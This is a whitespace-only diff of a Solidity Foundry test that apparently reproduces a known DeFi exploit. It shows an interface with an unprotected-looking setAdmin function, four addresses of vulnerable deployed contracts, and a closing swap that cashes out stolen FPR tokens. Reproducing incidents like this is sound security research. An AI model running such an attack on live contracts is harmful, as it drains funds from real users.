@@ -20,11 +20,14 @@ import "./../interface.sol";
 // https://twitter.com/chainlight_io/status/1603282848311480320
 
 interface VulContract {
+
     function setAdmin(address) external;
     function remaining(address, address) external;
+
 }
 
 contract ContractTest is Test {
+
     address[4] vulContracts = [
         0x81c5664be54d89E725ef155F14cf34e6213297B7,
         0xE2f0A9B60858f436e1f74d8CdbE03625b9bcc532,
@@ -68,4 +71,5 @@ contract ContractTest is Test {
             FPR.balanceOf(address(this)), 0, path, address(this), block.timestamp
         );
     }
+
 }
